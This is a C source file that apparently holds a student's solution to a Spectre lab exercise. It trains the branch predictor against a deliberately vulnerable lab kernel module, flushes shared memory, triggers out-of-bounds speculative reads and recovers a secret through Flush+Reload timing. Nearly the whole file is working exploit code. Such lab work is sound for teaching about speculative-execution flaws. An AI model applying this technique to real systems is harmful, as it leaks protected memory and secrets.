/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define DRAM_THRESHOLD 200
#define TRAINING_LOOPS 10

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??

        // 1. Train: Train the branch predictor to expect to perform the load (take the “if" branch) by calling the
        // method many times with a small offset.
        for (size_t i = 0; i < TRAINING_LOOPS; i++) {
            call_kernel_part2(kernel_fd, shared_memory, 0); // Call with a small offset to train the branch predictor
        }

        // 2. Flush: Flush the memory region from the cache using clflush.
        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
            clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE)); // Flush the start of each page
        }

        // 3. Victim execution: Call the victim method to leak a given secret byte past the limit during speculative
        // execution.
        call_kernel_part2(kernel_fd, shared_memory, current_offset);

        // 4. Reload: Reload the memory region, measure the latency of accessing each address, and use the
        // latency to determine the value of the secret.
        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
            size_t idx = i * SHD_SPECTRE_LAB_PAGE_SIZE; // 4096 * i to get the start of each page
            uint64_t time = time_access(shared_memory + idx);
            if (time < DRAM_THRESHOLD) {
                leaked_byte = (char)i;
            }
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
